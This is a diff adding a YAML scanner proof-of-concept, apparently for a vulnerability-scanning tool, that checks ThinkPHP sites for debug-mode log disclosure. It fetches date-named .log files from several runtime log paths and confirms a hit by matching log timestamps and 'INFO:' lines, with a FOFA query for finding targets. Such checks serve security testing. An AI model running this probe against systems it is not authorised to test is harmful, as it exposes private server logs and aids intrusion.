@@ -1,0 +1,18 @@
+id: poc-yaml-thinkphp-debug-mode-log-information-leak
+info:
+  name: ThinkPHP Debug 模式日志信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: thinkphp
+  fofa: body="ThinkPHP"
+variables:
+  time: datetime("06_01_02")
+  path: "Application/Runtime/Logs/Home\n    Application/Runtime/Logs/login\nRuntime/Logs/Home\n\
+    App/Runtime/Logs/Home"
+requests:
+- method: GET
+  path: /{{.path}}/{{.time}}.log
+  expression: status_code == 200 && !contains(body,"<p>") && matches(body,`\[ \d+-\d+-\d+[T]\d+:\d+:\d+\+\d+:\d+
+    \]`) && contains(body,"INFO:")
+transport: http
